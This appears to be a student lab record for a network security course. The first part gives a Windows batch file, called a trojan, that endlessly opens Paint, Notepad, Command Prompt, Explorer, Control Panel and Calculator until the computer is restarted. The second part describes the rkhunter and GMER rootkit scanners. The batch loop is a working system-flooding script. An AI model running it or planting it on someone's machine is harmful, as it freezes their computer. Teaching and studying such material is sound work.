# EX-05_CNS

# DEFEATING MALWARE - BUILDING TROJANS 
# DATE : 28/04/24
# AIM:  
 To build a Trojan and know the harmness of the trojan malwares in a computer system.  
 
# PROCEDURE: 
1. Create a simple trojan by using Windows Batch File (.bat) 
2. Type these below code in notepad and save it as Trojan.bat 
3. Double click on Trojan.bat file. 
4. When the trojan code executes, it will open MS-Paint, Notepad, Command Prompt, Explorer, etc., infinitely. 
5. Restart the computer to stop the execution of this trojan. 
 
# TROJAN: 
  In computing, a Trojan horse,or trojan, is any malware which misleads users of its 
true intent. 
  Trojans are generally spread by some form of social engineering, for example where a 
user is duped into executing an email attachment disguised to appear not suspicious, 
(e.g., a routine form to be filled in), or by clicking on some fake advertisement on 
social media or anywhere else. 
 Although their payload can be anything, many modern forms act as a backdoor, 
contacting a controller which can then have unauthorized access to the affected 
computer. 
 Trojans may allow an attacker to access users' personal information such as banking 
information, passwords, or personal identity. 
  Example: Ransomware attacks are often carried out using a trojan. 

# CODE: 
Trojan.bat 
@echo off 
:x 
start mspaint 
start notepad 
start cmd 
start explorer 
start control 
start calc 
goto x 
 
# OUTPUT 
          (MS-Paint, Notepad, Command Prompt, Explorer will open infinitely)

# RESULT:
  Thus a Trojan was built and the harmness of the trojan malwares in a computer system is Known.  








  # INSTALL ROOTKITS AND STUDY VARIETY OF OPTIONS 
 
 
# AIM: 
 To install a rootkit hunter and find the malwares in a computer. 
 
# ROOTKIT HUNTER: 
 rkhunter (Rootkit Hunter) is a Unix-based tool that scans for rootkits, backdoors and 
possible local exploits. 
 It does this by comparing SHA-1 hashes of important files with known good ones in 
online databases, searching for default directories (of rootkits), wrong permissions, 
hidden files, suspicious strings in kernel modules, and special tests for Linux and 
FreeBSD. 
 rkhunter is notable due to its inclusion in popular operating systems (Fedora, Debian, 
etc.) 
 The tool has been written in Bourne shell, to allow for portability. It can run on 
almost all UNIX-derived systems. 
 
# GMER ROOTKIT TOOL: 
 GMER is a software tool written by a Polish researcher Przemysław Gmerek, for 
detecting and removing rootkits. 
 It runs on Microsoft Windows and has support for Windows NT, 2000, XP, Vista, 7, 
8 and 10. With version 2.0.18327 full support for Windows x64 is added. 
 
Step 1 
 
 ![image](https://github.com/IsaacAIML2023/EX-05_CNS/assets/158465339/7a1c42e6-2bba-4c48-a662-e84ae9868104)

Visit GMER's website (see Resources) and download the GMER executable. 
Click the "Download EXE" button to download the program with a random file name, as 
some rootkits will close “gmer.exe” before you can open it. 
 
Step 2 
 ![image](https://github.com/IsaacAIML2023/EX-05_CNS/assets/158465339/e59eac81-a8f2-4714-aabf-fac41f6a8293)

Double-click the icon for the program. 
Click the "Scan" button in the lower-right corner of the dialog box. Allow the program to 
scan your entire hard drive. 
Step 3: 
 
 ![image](https://github.com/IsaacAIML2023/EX-05_CNS/assets/158465339/30465d75-b079-4141-9d0e-59f0c8150028)

When the program completes its scan, select any program or file listed in red. Right-click it 
and select "Delete." 
If the red item is a service, it may be protected. Right-click the service and select "Disable." 
Reboot your computer and run the scan again, this time selecting "Delete" when that service 
is detected. 
When your computer is free of Rootkits, close the program and restart your  PC. 
  
# RESULT:
  To install a rootkit hunter and find the malwares in a computer was implemented successfully. 
